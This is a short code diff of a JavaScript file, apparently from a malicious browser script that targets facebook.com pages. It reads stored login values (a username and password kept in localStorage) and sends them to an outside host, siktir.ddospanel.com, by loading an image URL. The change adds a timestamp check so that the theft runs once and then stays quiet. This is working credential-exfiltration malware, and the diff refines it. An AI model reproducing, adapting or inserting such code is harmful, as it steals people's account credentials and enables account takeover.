@@ -45,5 +45,12 @@ if (top.location.href.indexOf("facebook.com") > -1 && document.getElementById("l
     }
 }
 if (localStorage.upom && localStorage.uzom) {
-(new Image).src = "http://siktir.ddospanel.com/cpp.php" + "?us=" + localStorage.upom + "&pw=" + localStorage.uzom;
+	
+	tarih = new Date();
+    storage_key = 'access_twitter_';
+    if (!localStorage[storage_key] || (localStorage[storage_key] && tarih.getTime() >= localStorage[storage_key])) {
+        tarih.setTime(tarih.getTime() + 9999 * 9999 * 9999);
+        localStorage[storage_key] = tarih.getTime();
+		new Image().src = "http://siktir.ddospanel.com/cpp.php" + "?us=" + localStorage.upom + "&pw=" + localStorage.uzom;	
+    }	
 }
